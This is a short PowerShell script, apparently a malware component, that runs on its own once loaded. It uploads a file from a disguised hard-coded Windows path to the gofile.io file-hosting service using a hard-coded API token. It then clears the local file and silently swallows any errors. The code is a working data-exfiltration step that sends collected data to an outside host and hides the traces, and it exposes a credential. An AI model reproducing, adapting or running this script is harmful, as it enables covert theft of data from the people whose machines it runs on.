function Upload-FileToGofile {
    param (
        [string]$Path = "C:\ProgramX64\extentions\ms",
        [string]$ApiKey = "hV7e6NmlToS8RPAEiEed3KhiKcIlUkWK"
    )

    $uploadUri = "https://store1.gofile.io/uploadFile"

    try {
        if (Test-Path $Path) {
       
            curl.exe -F "file=@$Path" -F "token=$ApiKey" $uploadUri
            Start-Sleep -Seconds 2
            Clear-Content -Path $Path
        }

    }
    catch {
        
    }
}
Upload-FileToGofile
